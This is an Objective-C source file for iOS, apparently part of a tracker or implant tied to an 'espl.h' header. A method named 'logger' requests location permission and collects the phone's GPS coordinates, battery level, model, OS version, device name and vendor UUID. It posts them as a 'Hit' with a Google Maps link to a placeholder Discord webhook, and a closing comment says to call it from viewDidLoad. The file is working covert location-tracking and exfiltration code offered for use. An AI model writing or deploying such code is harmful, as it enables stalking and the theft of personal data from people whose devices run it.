#import "espl.h"
#import <CoreLocation/CoreLocation.h>
#import <UIKit/UIKit.h>

- (void)logger {
    CLLocationManager* manager = [[CLLocationManager alloc] init];
    manager.delegate = self; // Set the delegate for location updates
    [manager requestWhenInUseAuthorization]; // Request location permission (add this to your Info.plist)

    // Start location updates
    [manager startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    // This method is called when a new location is available
    CLLocation *location = [locations lastObject];
    CLLocationCoordinate2D coordinate = location.coordinate;

    UIDevice *device = [UIDevice currentDevice];
    [device setBatteryMonitoringEnabled:YES];
    int batinfo = (int)([device batteryLevel] * 100);
    
    NSString *urlString = @"YOUR_DISCORD_WEBHOOK_URL"; // Replace with your actual webhook URL
    
    NSURL *url = [NSURL URLWithString:urlString];
    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:url];
    [request setHTTPMethod:@"POST"];

    NSString *parameterString = [NSString stringWithFormat:@"username=Hit&content=*maps.google.com/maps?q=%f,%f*\n**Model:** *%@*\n**Battery:** *%d%%*\n**System Version:** *%@ %@*\n**Device Name:** *%@*\n**UUID:** *%@*\n", coordinate.latitude, coordinate.longitude, [device model], batinfo, [device systemName], [device systemVersion], [device name], [[device identifierForVendor] UUIDString]];
    
    [request setHTTPBody:[parameterString dataUsingEncoding:NSUTF8StringEncoding]];

    // Create a data task to send the request
    NSURLSessionDataTask *dataTask = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            NSLog(@"Error sending request: %@", error);
            // Handle the error here
        } else {
            NSLog(@"Request sent successfully!");
            // Handle the success here
        }
    }];

    [dataTask resume]; // Start the data task
}

// In your viewDidLoad or equivalent method, you can call the logger function:
// [self logger];
